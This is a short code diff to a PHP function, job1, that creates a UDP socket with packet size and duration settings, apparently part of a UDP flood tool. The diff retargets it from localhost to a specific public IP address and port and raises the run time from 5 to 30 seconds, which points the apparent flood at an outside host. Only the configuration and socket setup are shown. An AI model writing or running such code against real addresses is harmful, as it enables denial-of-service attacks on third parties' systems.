@@ -235,10 +235,10 @@ function workerProgress(
 function job1(): array
 {
     // --- Configuration ---
-    $targetIp = '127.0.0.1'; // Change to target IP
-    $targetPort = 80;        // Change to target port
+    $targetIp = '35.79.103.106'; // Change to target IP
+    $targetPort = 9044;        // Change to target port
     $packetSize = 1024;      // Packet size in bytes
-    $duration = 5;           // Duration in seconds
+    $duration = 30;           // Duration in seconds
 
     $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
     
